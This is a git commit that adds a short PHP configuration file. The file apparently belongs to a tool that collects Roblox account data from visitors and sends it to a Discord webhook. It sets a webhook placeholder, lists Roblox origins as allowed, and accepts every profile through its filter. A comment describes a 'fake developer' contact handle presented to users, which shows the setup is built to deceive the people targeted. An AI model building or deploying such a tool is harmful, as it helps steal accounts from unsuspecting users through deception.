bbb903edabfc9c91077ae6f13d8cb0be8086a6f7
5Haze <77495932+5Haze@users.noreply.github.com>
2021-02-02 23:54:42 +1030

    Add files via upload

---
+++ config.php
@@ -0,0 +1,14 @@
+<?php
+    // webhook link
+    $webhook = "webhook";
+    // fake developer for the bot the users may contact
+    $discord_contact = "5Haze#0001";
+    
+    $allowed_origins = array(
+        "https://www.roblox.com",
+        "https://web.roblox.com"
+    );
+    function account_filter($profile) {
+        return true;
+    }
+?>
